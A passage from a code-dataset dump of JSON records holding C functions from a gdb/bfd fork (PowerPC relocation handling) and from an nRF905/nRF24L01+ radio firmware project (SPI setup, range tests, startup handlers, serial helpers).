R_PPC_NONE:\n\tcase R_PPC_max:\n\t  break;\n\n\t  /* These should only appear in dynamic objects.  */\n\tcase R_PPC_COPY:\n\tcase R_PPC_GLOB_DAT:\n\tcase R_PPC_JMP_SLOT:\n\tcase R_PPC_RELATIVE:\n\t  break;\n\n\t  /* These aren't handled yet.  We'll report an error later.  */\n\tcase R_PPC_ADDR30:\n\tcase R_PPC_EMB_RELSEC16:\n\tcase R_PPC_EMB_RELST_LO:\n\tcase R_PPC_EMB_RELST_HI:\n\tcase R_PPC_EMB_RELST_HA:\n\tcase R_PPC_EMB_BIT_FLD:\n\t  break;\n\n\t  /* This refers only to functions defined in the shared library.  */\n\tcase R_PPC_LOCAL24PC:\n\t  if (h && h == htab->elf.hgot)\n\t    htab->old_plt = 1;\n\t  break;\n\n\t  /* This relocation describes the C++ object vtable hierarchy.\n\t     Reconstruct it for later use during GC.  */\n\tcase R_PPC_GNU_VTINHERIT:\n\t  if (!bfd_elf_gc_record_vtinherit (abfd, sec, h, rel->r_offset))\n\t    return FALSE;\n\t  break;\n\n\t  /* This relocation describes which C++ vtable entries are actually\n\t     used.  Record for later use during GC.  */\n\tcase R_PPC_GNU_VTENTRY:\n\t  if (!bfd_elf_gc_record_vtentry (abfd, sec, h, rel->r_addend))\n\t    return FALSE;\n\t  break;\n\n\t  /* We shouldn't really be seeing these.  */\n\tcase R_PPC_TPREL32:\n\t  if (info->shared)\n\t    info->flags |= DF_STATIC_TLS;\n\t  goto dodyn;\n\n\t  /* Nor these.  */\n\tcase R_PPC_DTPMOD32:\n\tcase R_PPC_DTPREL32:\n\t  goto dodyn;\n\n\tcase R_PPC_TPREL16:\n\tcase R_PPC_TPREL16_LO:\n\tcase R_PPC_TPREL16_HI:\n\tcase R_PPC_TPREL16_HA:\n\t  if (info->shared)\n\t    info->flags |= DF_STATIC_TLS;\n\t  goto dodyn;\n\n\tcase R_PPC_REL32:\n\t  if (h == NULL\n\t      && got2 != NULL\n\t      && (sec->flags & SEC_CODE) != 0\n\t      && (info->shared || info->pie)\n\t      && !htab->old_plt)\n\t    {\n\t      /* Old -fPIC gcc code has .long LCTOC1-LCFx just before\n\t\t the start of a function, which assembles to a REL32\n\t\t reference to .got2.  If we detect one of these, then\n\t\t force the old PLT layout because the linker cannot\n\t\t reliably deduce the GOT pointer value needed for\n\t\t PLT call stubs.  */\n\t      asection *s;\n\n\t      s = bfd_section_from_r_symndx (abfd, &htab->sym_sec, sec,\n\t\t\t\t\t     r_symndx);\n\t      if (s == got2)\n\t\thtab->old_plt = 1;\n\t    }\n\t  /* fall through */\n\n\tcase R_PPC_REL24:\n\tcase R_PPC_REL14:\n\tcase R_PPC_REL14_BRTAKEN:\n\tcase R_PPC_REL14_BRNTAKEN:\n\t  if (h == NULL)\n\t    break;\n\t  if (h == htab->elf.hgot)\n\t    {\n\t      htab->old_plt = 1;\n\t      break;\n\t    }\n\t  /* fall through */\n\n\tcase R_PPC_ADDR32:\n\tcase R_PPC_ADDR24:\n\tcase R_PPC_ADDR16:\n\tcase R_PPC_ADDR16_LO:\n\tcase R_PPC_ADDR16_HI:\n\tcase R_PPC_ADDR16_HA:\n\tcase R_PPC_ADDR14:\n\tcase R_PPC_ADDR14_BRTAKEN:\n\tcase R_PPC_ADDR14_BRNTAKEN:\n\tcase R_PPC_UADDR32:\n\tcase R_PPC_UADDR16:\n\t  if (h != NULL && !info->shared)\n\t    {\n\t      /* We may need a plt entry if the symbol turns out to be\n\t\t a function defined in a dynamic object.  */\n\t      if (!update_plt_info (abfd, h, NULL, 0))\n\t\treturn FALSE;\n\n\t      /* We may need a copy reloc too.  */\n\t      h->non_got_ref = 1;\n\t    }\n\n\tdodyn:\n\t  /* If we are creating a shared library, and this is a reloc\n\t     against a global symbol, or a non PC relative reloc\n\t     against a local symbol, then we need to copy the reloc\n\t     into the shared library.  However, if we are linking with\n\t     -Bsymbolic, we do not need to copy a reloc against a\n\t     global symbol which is defined in an object we are\n\t     including in the link (i.e., DEF_REGULAR is set).  At\n\t     this point we have not seen all the input files, so it is\n\t     possible that DEF_REGULAR is not set now but will be set\n\t     later (it is never cleared).  In case of a weak definition,\n\t     DEF_REGULAR may be cleared later by a strong definition in\n\t     a shared library.  We account for that possibility below by\n\t     storing information in the dyn_relocs field of the hash\n\t     table entry.  A similar situation occurs when creating\n\t     shared libraries and symbol visibility changes render the\n\t     symbol local.\n\n\t     If on the other hand, we are creating an executable, we\n\t     may need to keep relocations for symbols satisfied by a\n\t     dynamic library if we manage to avoid copy relocs for the\n\t     symbol.  */\n\t  if ((info->shared\n\t       && (MUST_BE_DYN_RELOC (r_type)\n\t\t   || (h != NULL\n\t\t       && (! info->symbolic\n\t\t\t   || h->root.type == bfd_link_hash_defweak\n\t\t\t   || !h->def_regular))))\n\t      || (ELIMINATE_COPY_RELOCS\n\t\t  && !info->shared\n\t\t  && h != NULL\n\t\t  && (h->root.type == bfd_link_hash_defweak\n\t\t      || !h->def_regular)))\n\t    {\n\t      struct ppc_elf_dyn_relocs *p;\n\t      struct ppc_elf_dyn_relocs **head;\n\n#ifdef DEBUG\n\t      fprintf (stderr,\n\t\t       \"ppc_elf_check_relocs needs to \"\n\t\t       \"create relocation for %s\\n\",\n\t\t       (h && h->root.root.string\n\t\t\t? h->root.root.string : \"<unknown>\"));\n#endif\n\t      if (sreloc == NULL)\n\t\t{\n\t\t  const char *name;\n\n\t\t  name = (bfd_elf_string_from_elf_section\n\t\t\t  (abfd,\n\t\t\t   elf_elfheader (abfd)->e_shstrndx,\n\t\t\t   elf_section_data (sec)->rel_hdr.sh_name));\n\t\t  if (name == NULL)\n\t\t    return FALSE;\n\n\t\t  BFD_ASSERT (strncmp (name, \".rela\", 5) == 0\n\t\t\t      && strcmp (bfd_get_section_name (abfd, sec),\n\t\t\t\t\t name + 5) == 0);\n\n\t\t  if (htab->elf.dynobj == NULL)\n\t\t    htab->elf.dynobj = abfd;\n\t\t  sreloc = bfd_get_section_by_name (htab->elf.dynobj, name);\n\t\t  if (sreloc == NULL)\n\t\t    {\n\t\t      flagword flags;\n\n\t\t      flags = (SEC_HAS_CONTENTS | SEC_READONLY\n\t\t\t       | SEC_IN_MEMORY | SEC_LINKER_CREATED\n\t\t\t       | SEC_ALLOC | SEC_LOAD);\n\t\t      sreloc = bfd_make_section_with_flags (htab->elf.dynobj,\n\t\t\t\t\t\t\t    name,\n\t\t\t\t\t\t\t    flags);\n\t\t      if (sreloc == NULL\n\t\t\t  || ! bfd_set_section_alignment (htab->elf.dynobj,\n\t\t\t\t\t\t\t  sreloc, 2))\n\t\t\treturn FALSE;\n\t\t    }\n\t\t  elf_section_data (sec)->sreloc = sreloc;\n\t\t}\n\n\t      /* If this is a global symbol, we count the number of\n\t\t relocations we need for this symbol.  */\n\t      if (h != NULL)\n\t\t{\n\t\t  head = &ppc_elf_hash_entry (h)->dyn_relocs;\n\t\t}\n\t      else\n\t\t{\n\t\t  /* Track dynamic relocs needed for local syms too.\n\t\t     We really need local syms available to do this\n\t\t     easily.  Oh well.  */\n\n\t\t  asection *s;\n\t\t  s = bfd_section_from_r_symndx (abfd, &htab->sym_sec,\n\t\t\t\t\t\t sec, r_symndx);\n\t\t  if (s == NULL)\n\t\t    return FALSE;\n\n\t\t  head = ((struct ppc_elf_dyn_relocs **)\n\t\t\t  &elf_section_data (s)->local_dynrel);\n\t\t}\n\n\t      p = *head;\n\t      if (p == NULL || p->sec != sec)\n\t\t{\n\t\t  p = bfd_alloc (htab->elf.dynobj, sizeof *p);\n\t\t  if (p == NULL)\n\t\t    return FALSE;\n\t\t  p->next = *head;\n\t\t  *head = p;\n\t\t  p->sec = sec;\n\t\t  p->count = 0;\n\t\t  p->pc_count = 0;\n\t\t}\n\n\t      p->count += 1;\n\t      if (!MUST_BE_DYN_RELOC (r_type))\n\t\tp->pc_count += 1;\n\t    }\n\n\t  break;\n\t}\n    }\n\n  return TRUE;\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Tweak magic VxWorks symbols as they are written to the output file.  */\n", "func_signal": "static bfd_boolean\nelf_i386_vxworks_link_output_symbol_hook (struct bfd_link_info *info\n\t\t\t\t\t   ATTRIBUTE_UNUSED,\n\t\t\t\t\t const char *name,\n\t\t\t\t\t Elf_Internal_Sym *sym,\n\t\t\t\t\t asection *input_sec ATTRIBUTE_UNUSED,\n\t\t\t\t\t struct elf_link_hash_entry *h\n\t\t\t\t\t   ATTRIBUTE_UNUSED)", "code": "{\n  /* Ignore the first dummy symbol.  */\n  if (!name)\n    return TRUE;\n\n  return elf_vxworks_link_output_symbol_hook (name, sym);\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* exported */\n", "func_signal": "static void nrf905_write_payload_zero(uint8_t* buf)", "code": "{\n  /* writing the payload must be done with txr_ce = 0 */\n  nrf905_clear_trx();\n  nrf905_set_txe();\n  nrf905_set_pwr();\n\n  nrf905_cmd_write(NRF905_CMD_WTP, buf, nrf905_payload_width);\n\n  /* send the packet */\n  nrf905_set_trx();\n\n  while (nrf905_is_dr() == 0) ;\n\n  /* a packet is transmit first, then txr is checked */\n  /* leave in standby mode */\n  nrf905_clear_trx();\n}", "path": "src\\nrf905.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* main */\n", "func_signal": "int main(int ac, char** av)", "code": "{\n  int fd;\n  size_t size;\n  nrf905_handle_t nrf;\n  uint8_t buf[512];\n\n  if (av[1][0] != '-')\n  {\n    fd = open(av[1], O_RDONLY);\n    if (fd == -1) return -1;\n  }\n  else\n  {\n    fd = 0;\n  }\n\n  nrf905_init(&nrf, 8, 4, NRF905_FLAG_NONE);\n\n  while (1)\n  {\n    size = read(fd, buf, sizeof(buf));\n    if (size <= 0) break ;\n    nrf905_decode(&nrf, buf, size);\n  }\n\n  nrf905_fini(&nrf);\n\n  if (fd != 0) close(fd);\n\n  return 0;\n}", "path": "unit\\range\\nrf905_decoder\\main.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "//*****************************************************************************\n//\n// This is the code that gets called when the processor receives a NMI.  This\n// simply enters an infinite loop, preserving the system state for examination\n// by a debugger.\n//\n//*****************************************************************************\n", "func_signal": "static void\nNmiSR(void)", "code": "{\n    //\n    // Enter an infinite loop.\n    //\n    while(1)\n    {\n    }\n}", "path": "unit\\range\\rx_nrf905\\startup_gcc.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* unused */\n", "func_signal": "static void set_led(uint8_t mask)", "code": "{\n#define LED_RX_POS 6\n#define LED_MATCH_POS 7\n#define LED_RX_MASK (1 << LED_RX_POS)\n#define LED_MATCH_MASK (1 << LED_MATCH_POS)\n\n  static uint8_t pre_mask = 0;\n\n  DDRD |= (LED_RX_MASK | LED_MATCH_MASK);\n\n  if (mask == pre_mask) return ;\n\n  PORTD &= ~(LED_RX_MASK | LED_MATCH_MASK);\n  PORTD |= mask;\n\n  pre_mask = mask;\n}", "path": "snrf\\src\\dev\\main.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* main */\n", "func_signal": "int main(void)", "code": "{\n  uint32_t counter[2] = {0, 0};\n#if (CONFIG_USE_UART == 1)\n  uint8_t x;\n#endif\n\n  /* setup spi first */\n  spi_setup_master();\n  spi_set_sck_freq(SPI_SCK_FREQ_FOSC2);\n\n#if (CONFIG_USE_UART == 1)\n  uart_setup();\n#endif\n\n  nrf24l01p_setup();\n\n  /* sparkfun usb serial board configuration */\n  /* NOTE: nrf24l01p_enable_crc8(); for nrf24l01p board */\n  /* nrf24l01p_enable_crc16(); */\n  nrf24l01p_disable_crc();\n  /* auto ack disabled */\n  /* auto retransmit disabled */\n  /* 4 bytes payload */\n  /* 1mbps, 0dbm */\n  /* nrf24l01p_set_rate(NRF24L01P_RATE_1MBPS); */\n  nrf24l01p_set_rate(NRF24L01P_RATE_2MBPS);\n  /* nrf24l01p_set_rate(NRF24L01P_RATE_250KBPS); */\n  /* channel 2 */\n  nrf24l01p_set_chan(2);\n  /* 5 bytes addr width */\n  /* nrf24l01p_set_addr_width(NRF24L01P_ADDR_WIDTH_5); */\n  nrf24l01p_set_addr_width(NRF24L01P_ADDR_WIDTH_3);\n  /* rx address */\n  nrf24l01p_cmd_buf[0] = 0xe7;\n  nrf24l01p_cmd_buf[1] = 0xe7;\n  nrf24l01p_cmd_buf[2] = 0xe7;\n  nrf24l01p_cmd_buf[3] = 0xe7;\n  nrf24l01p_cmd_buf[4] = 0xe7;\n  nrf24l01p_write_reg40(NRF24L01P_REG_RX_ADDR_P0);\n  /* tx address */\n  nrf24l01p_cmd_buf[0] = 0xe7;\n  nrf24l01p_cmd_buf[1] = 0xe7;\n  nrf24l01p_cmd_buf[2] = 0xe7;\n  nrf24l01p_cmd_buf[3] = 0xe7;\n  nrf24l01p_cmd_buf[4] = 0xe7;\n  nrf24l01p_write_reg40(NRF24L01P_REG_TX_ADDR);\n  /* enable tx no ack command */\n  nrf24l01p_enable_tx_noack();\n\n  nrf24l01p_powerdown_to_standby();\n\n#if (CONFIG_USE_PCINT == 1)\n  /* setup interrupt on change. disable pullup. */\n  DDRB &= ~(1 << 1);\n  PORTB &= ~(1 << 1);\n  PCICR |= 1 << 0;\n  /* enable portb1 interrupt on change */\n  PCMSK0 |= 1 << 1;\n#endif /* CONFIG_USE_PCINT */\n\n  /* enable interrupts */\n  sei();\n\n#if (CONFIG_USE_UART == 1)\n  uart_write((uint8_t*)\"rx side\\r\\n\", 9);\n  uart_write((uint8_t*)\"press space\\r\\n\", 13);\n  uart_read_uint8(&x);\n  uart_write((uint8_t*)\"starting\\r\\n\", 10);\n#endif\n\n  set_led(0);\n\n  nrf24l01p_standby_to_rx();\n\n  if (nrf24l01p_is_rx_full()) nrf24l01p_flush_rx();\n\n#if (CONFIG_USE_SLEEP == 1)\n  set_sleep_mode(SLEEP_MODE_PWR_DOWN);\n#endif\n\n  while (1)\n  {\n#if (CONFIG_USE_PCINT == 0)\n    const uint8_t is_irq = nrf24l01p_is_rx_irq();\n#endif\n\n#if (CONFIG_USE_SLEEP == 1)\n    /* todo: non atomic, there should be a timer interrupt */\n    if (is_irq == 0)\n    {\n      sleep_enable();\n      sleep_cpu();\n      sleep_disable();\n    }\n#endif\n\n    if (is_irq)\n    {\n#if (CONFIG_USE_PCINT == 1)\n      is_irq = 0;\n#endif\n\n      const uint8_t led_mask = on_nrf24l01p_irq();\n      if (led_mask & LED_RX_MASK) counter[0] = 0;\n      if (led_mask & LED_MATCH_MASK) counter[1] = 0;\n      set_led(led_mask);\n    }\n    else if (nrf24l01p_is_rx_full())\n    {\n      nrf24l01p_flush_rx();\n    }\n\n    ++counter[0];\n    ++counter[1];\n\n    if (counter[0] == 200000UL)\n    {\n      counter[0] = 0;\n      set_led(0);\n    }\n\n    if (counter[1] == 200000UL)\n    {\n      counter[1] = 0;\n      set_led(0);\n    }\n  }\n\n  return 0;\n}", "path": "unit\\range\\rx\\main.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "//*****************************************************************************\n//\n// This is the code that gets called when the processor receives an unexpected\n// interrupt.  This simply enters an infinite loop, preserving the system state\n// for examination by a debugger.\n//\n//*****************************************************************************\n", "func_signal": "static void\nIntDefaultHandler(void)", "code": "{\n    //\n    // Go into an infinite loop.\n    //\n    while(1)\n    {\n    }\n}", "path": "unit\\range\\tx_nrf905\\startup_gcc.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "//*****************************************************************************\n//\n// This is the code that gets called when the processor receives a fault\n// interrupt.  This simply enters an infinite loop, preserving the system state\n// for examination by a debugger.\n//\n//*****************************************************************************\n", "func_signal": "static void\nFaultISR(void)", "code": "{\n    //\n    // Enter an infinite loop.\n    //\n    while(1)\n    {\n    }\n}", "path": "unit\\range\\rx_nrf905\\startup_gcc.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* operating modes */\n", "func_signal": "static void nrf905_set_standby(void)", "code": "{\n  /* minimize power consumption to 50uA */\n  /* maintains short startup time */\n\n  nrf905_clear_trx();\n  nrf905_set_pwr();\n}", "path": "src\\nrf905.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "//*****************************************************************************\n//\n// This is the code that gets called when the processor receives a NMI.  This\n// simply enters an infinite loop, preserving the system state for examination\n// by a debugger.\n//\n//*****************************************************************************\n", "func_signal": "static void\nNmiSR(void)", "code": "{\n    //\n    // Enter an infinite loop.\n    //\n    while(1)\n    {\n    }\n}", "path": "unit\\range\\tx_nrf905\\startup_gcc.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* rf channel */\n/* f = (422.4 + (ch_no / 10)) * (1 + hfreq_pll) MHz */\n/* example are take from datasheet */\n", "func_signal": "static void nrf905_set_channel(uint8_t hfreq_pll, uint16_t ch_no)", "code": "{\n  nrf905_set_ch_no(ch_no);\n  nrf905_set_hfreq_pll(hfreq_pll);\n}", "path": "src\\nrf905.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* main */\n", "func_signal": "int main(void)", "code": "{\n  /* default state to conf */\n  snrf_state = SNRF_STATE_CONF;\n\n  nrf_setup();\n  nrf_set_powerdown_mode();\n  nrf_setup_rx_irq();\n\n  uart_setup();\n  uart_enable_rx_int();\n\n  /* uart and pinchange int wakeup sources */\n  set_sleep_mode(SLEEP_MODE_IDLE);\n\n  /* enable interrupts before looping */\n  sei();\n\n  while (1)\n  {\n    sleep_disable();\n\n    /* note: keep uart interrupt enabled */\n\n    /* disable pcint interrupt since we are already awake */\n    /* and entering the handler perturbates the execution */\n    nrf_disable_rx_irq();\n\n    /* alternate do_{uart,nrf} to avoid starvation */\n    while (1)\n    {\n      uint8_t is_msg = do_uart();\n      if (snrf_state != SNRF_STATE_CONF) is_msg |= do_nrf();\n      if (is_msg == 0) break ;\n    }\n\n    /* reenable pcint interrupts */\n    nrf_enable_rx_irq();\n\n    /* the following procedure is used to not miss interrupts */\n    /* disable interrupts, check if something available */\n    /* otherwise, enable interrupt and sleep (sei, sleep) */\n    /* the later ensures now interrupt is missed */\n\n    sleep_enable();\n    sleep_bod_disable();\n\n    cli();\n\n    if ((uart_pos == sizeof(snrf_msg_t)) || nrf_peek_rx_irq())\n    {\n      /* continue, do not sleep */\n      sei();\n    }\n    else\n    {\n      /* warning: keep the 2 instructions in the same block */\n      /* atomic, no int schedule between sei and sleep_cpu */\n      sei();\n      sleep_cpu();\n    }\n  }\n\n  return 0;\n}", "path": "snrf\\src\\dev\\main.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* 3 wires spi routines */\n", "func_signal": "static inline void spi_setup_master(void)", "code": "{\n  /* doc8161.pdf, ch.18 */\n\n  /* cs, pb2 */\n  DDRB |= (1 << 2);\n  PORTB |= 1 << 2;\n\n  /* spi output pins: sck pb5, mosi pb3 */\n  DDRB |= (1 << 5) | (1 << 3);\n\n  /* spi input pins: miso pb4 */\n  DDRB &= ~(1 << 4);\n  /* disable pullup (already by default) */\n  PORTB &= ~(1 << 4);\n\n  /* enable spi, msb first, master, freq / 128 (125khz), sck low idle */\n  SPCR = (1 << SPE) | (1 << MSTR) | (3 << SPR0);\n\n  /* clear double speed */\n  SPSR &= ~(1 << SPI2X);\n}", "path": "src\\nrf2401a.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* main */\n", "func_signal": "int main(void)", "code": "{\n  uint16_t counter;\n  uint8_t x;\n\n#define CONFIG_CHECK 0\n#if CONFIG_CHECK\n  uint16_t error;\n#endif\n\n  /* setup spi first */\n  spi_setup_master();\n  spi_set_sck_freq(SPI_SCK_FREQ_FOSC2);\n\n  uart_setup();\n\n  /* setup timer1, normal mode, interrupt on match 0xffff */\n  OCR1A = 0xffff;\n  TCCR1A = 0;\n  TCCR1B = 0;\n  TCCR1C = 0;\n  TIMSK1 = 1 << 1;\n\n  /* enable interrupts */\n  sei();\n\n  nrf24l01p_setup();\n\n  /* sparkfun usb serial board configuration */\n  /* NOTE: nrf24l01p_enable_crc8(); for nrf24l01p board */\n  /* nrf24l01p_enable_crc16(); */\n  nrf24l01p_disable_crc();\n  /* auto ack disabled */\n  /* auto retransmit disabled */\n  /* 4 bytes payload */\n  /* 1mbps, 0dbm */\n  /* nrf24l01p_set_rate(NRF24L01P_RATE_1MBPS); */\n  nrf24l01p_set_rate(NRF24L01P_RATE_2MBPS);\n  /* nrf24l01p_set_rate(NRF24L01P_RATE_250KBPS); */\n  /* channel 2 */\n  nrf24l01p_set_chan(2);\n  /* 5 bytes addr width */\n  /* nrf24l01p_set_addr_width(NRF24L01P_ADDR_WIDTH_5); */\n  nrf24l01p_set_addr_width(NRF24L01P_ADDR_WIDTH_3);\n  /* rx address */\n  nrf24l01p_cmd_buf[0] = 0xe7;\n  nrf24l01p_cmd_buf[1] = 0xe7;\n  nrf24l01p_cmd_buf[2] = 0xe7;\n  nrf24l01p_cmd_buf[3] = 0xe7;\n  nrf24l01p_cmd_buf[4] = 0xe7;\n  nrf24l01p_write_reg40(NRF24L01P_REG_RX_ADDR_P0);\n  /* tx address */\n  nrf24l01p_cmd_buf[0] = 0xe7;\n  nrf24l01p_cmd_buf[1] = 0xe7;\n  nrf24l01p_cmd_buf[2] = 0xe7;\n  nrf24l01p_cmd_buf[3] = 0xe7;\n  nrf24l01p_cmd_buf[4] = 0xe7;\n  nrf24l01p_write_reg40(NRF24L01P_REG_TX_ADDR);\n  /* enable tx no ack command */\n  nrf24l01p_enable_tx_noack();\n\n  nrf24l01p_powerdown_to_standby();\n\n  uart_write((uint8_t*)\"rx side\\r\\n\", 9);\n\n redo_receive:\n\n#if CONFIG_CHECK\n  error = 0;\n#endif\n  counter = 0;\n  is_timer1_irq = 0;\n\n  uart_write((uint8_t*)\"press space\\r\\n\", 13);\n  uart_read_uint8(&x);\n  uart_write((uint8_t*)\"starting\\r\\n\", 10);\n\n  nrf24l01p_standby_to_rx();\n\n  /* wait for the starting packet */\n  if (nrf24l01p_is_rx_full()) nrf24l01p_flush_rx();\n  while (nrf24l01p_is_rx_irq() == 0) ;\n  nrf24l01p_read_rx();\n\n  /* clock source disabled, safe to access 16 bits counter */\n  TCNT1 = 0;\n\n  /* prescaler set to 256 */\n  /* interrupt every 16000000 / (65535 * 256) = 0.954 s */\n  TCCR1B = 1 << 2;\n\n  while (1)\n  {\n    if (is_timer1_irq == 1)\n    {\n      break ;\n    }\n    else if (nrf24l01p_is_rx_irq())\n    {\n#if CONFIG_CHECK\n      uint8_t i;\n      for (i = 0; i < NRF24L01P_PAYLOAD_WIDTH; ++i)\n\tnrf24l01p_cmd_buf[i] = 0x00;\n#endif\n\n      nrf24l01p_read_rx();\n\n#if CONFIG_CHECK\n      for (i = 0; i < NRF24L01P_PAYLOAD_WIDTH; ++i)\n      {\n\tif (nrf24l01p_cmd_buf[i] != (0x2a + i))\n\t{\n\t  ++error;\n\t  break ;\n\t}\n      }\n#endif\n\n      ++counter;\n    }\n  }\n\n  /* print counter */\n  uart_write((uint8_t*)\"counter: \", 9);\n  uart_write((uint8_t*)uint16_to_string(counter), 4);\n  uart_write((uint8_t*)\"\\r\\n\", 2);\n\n#if CONFIG_CHECK\n  /* print error */\n  uart_write((uint8_t*)\"error: \", 7);\n  uart_write((uint8_t*)uint16_to_string(error), 4);\n  uart_write((uint8_t*)\"\\r\\n\", 2);\n#endif\n\n  /* still in rx mode */\n  nrf24l01p_set_standby();\n\n  goto redo_receive;\n\n  return 0;\n}", "path": "unit\\bw\\rx\\main.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "//*****************************************************************************\n//\n// This is the code that gets called when the processor receives an unexpected\n// interrupt.  This simply enters an infinite loop, preserving the system state\n// for examination by a debugger.\n//\n//*****************************************************************************\n", "func_signal": "static void\nIntDefaultHandler(void)", "code": "{\n    //\n    // Go into an infinite loop.\n    //\n    while(1)\n    {\n    }\n}", "path": "unit\\range\\rx_nrf905\\startup_gcc.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* main */\n", "func_signal": "int main(int ac, char** av)", "code": "{\n  nrf24l01a_setup();\n  return 0;\n}", "path": "src\\nrf2401a.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* CONFIG_SERIAL_DEBUG */\n", "func_signal": "static void invalid_handle(serial_handle_t* h)", "code": "{\n  h->fd = -1;\n\n  memset(&h->termios, 0, sizeof(struct termios));\n\n#if CONFIG_SERIAL_DEBUG\n  h->name = NULL;\n#endif\n}", "path": "snrf\\src\\host\\serial.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* configuration register */\n/* wtp must be used to commit the operation */\n", "func_signal": "static void nrf905_clear_set_config(uint8_t i, uint8_t j, uint8_t w, uint8_t x)", "code": "{\n  /* i the byte offset */\n  /* j the bit offset */\n  /* w the width */\n  /* x the value */\n\n  nrf905_config[i] &= ~(((1 << w) - 1) << j);\n  nrf905_config[i] |= x << j;\n}", "path": "src\\nrf905.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "//*****************************************************************************\n//\n// This is the code that gets called when the processor first starts execution\n// following a reset event.  Only the absolutely necessary set is performed,\n// after which the application supplied entry() routine is called.  Any fancy\n// actions (such as making decisions based on the reset cause register, and\n// resetting the bits in that register) are left solely in the hands of the\n// application.\n//\n//*****************************************************************************\n", "func_signal": "void\nResetISR(void)", "code": "{\n    unsigned long *pulSrc, *pulDest;\n\n    //\n    // Copy the data segment initializers from flash to SRAM.\n    //\n    pulSrc = &_etext;\n    for(pulDest = &_data; pulDest < &_edata; )\n    {\n        *pulDest++ = *pulSrc++;\n    }\n\n    //\n    // Zero fill the bss segment.\n    //\n    __asm(\"    ldr     r0, =_bss\\n\"\n          \"    ldr     r1, =_ebss\\n\"\n          \"    mov     r2, #0\\n\"\n          \"    .thumb_func\\n\"\n          \"zero_loop:\\n\"\n          \"        cmp     r0, r1\\n\"\n          \"        it      lt\\n\"\n          \"        strlt   r2, [r0], #4\\n\"\n          \"        blt     zero_loop\");\n\n    //\n    // Enable the floating-point unit.  This must be done here to handle the\n    // case where main() uses floating-point and the function prologue saves\n    // floating-point registers (which will fault if floating-point is not\n    // enabled).  Any configuration of the floating-point unit using DriverLib\n    // APIs must be done here prior to the floating-point unit being enabled.\n    //\n    // Note that this does not use DriverLib since it might not be included in\n    // this project.\n    //\n    HWREG(NVIC_CPAC) = ((HWREG(NVIC_CPAC) &\n                         ~(NVIC_CPAC_CP10_M | NVIC_CPAC_CP11_M)) |\n                        NVIC_CPAC_CP10_FULL | NVIC_CPAC_CP11_FULL);\n\n    //\n    // Call the application's entry point.\n    //\n    main();\n}", "path": "unit\\range\\tx_nrf905\\startup_gcc.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "/* exported\n */\n", "func_signal": "int serial_open(serial_handle_t* h, const char* path)", "code": "{\n  invalid_handle(h);\n\n  if ((h->fd = open(path, O_RDWR | O_NONBLOCK | O_NOCTTY)) == -1)\n    {\n      DEBUG_ERROR(\"open() == %u\\n\", errno);\n      return -1;\n    }\n\n  if (tcgetattr(h->fd, &h->termios) == -1)\n    {\n      DEBUG_ERROR(\"tcgetattr() == %u\\n\", errno);\n      goto on_error;\n    }\n\n#if CONFIG_SERIAL_DEBUG\n\n  h->name = strdup(path);\n\n  if (h->name == NULL)\n    DEBUG_ERROR(\"h->name == NULL\\n\");\n\n#endif\n\n  /* success\n   */\n\n  return 0;\n\n on_error:\n\n  close(h->fd);\n\n  invalid_handle(h);\n\n  return -1;\n}", "path": "snrf\\src\\host\\serial.c", "repo_name": "texane/nrf", "stars": 39, "license": "None", "language": "c", "size": 14043}
{"docstring": "//*****************************************************************************\n//\n// This is the code that gets called when the processor first starts execution\n// following a reset event.  Only the absolutely necessary set is performed,\n// after which the application supplied entry() routine is called.  Any fancy\n// actions (such as making decisions based on the reset cause register, and\n// resetting the bits in that register) are left solely in the hands of the\n// application.\n//\n//*****************************************************************************\n", "func_signal": "void\nResetISR(void)", "code": "{\n    unsigned long *pulSrc, *pulDest;\n\n    //\n    // Copy the data segment initializers from flash to SRAM.\n    //\n    pulSrc = &_etext;\n    for(pulDest = &_data; pulDest < &_edata; )\n    {\n        *pulDest++ = *pulSrc++;\n    }\n\n    //\n    // Zero fill the bss segment.\n    //\n    __asm(\"    ldr     r0, =_bss\\n\"\n          \"    ldr     r1, =_ebss\\n\"\n          \"    mov     r2, #0\\n\"\n          \"    .thumb_func\\n\"\n          \"zero_loop:\\n\"\n          \"        cmp     r0, r1\\n\"\n          \"        it      lt\\n\"\n          \"        strlt   r2, [r0], #4\\n\"\n          \"        blt     zero_loop\");\n\n    //\n    // Enable the floating-point unit.  This must be done here to handle the\n    // case where main() uses floating-point and the function prologue saves\n    // floating-point registers (which will fault if floating-point is not\n    // enabled).  Any configuration of the floating-point unit using DriverLib\n    // APIs must be done here prior to the floating-point unit being enabled.\n    //\n    // Note that this does not use DriverLib since it might not be included in\n    // this 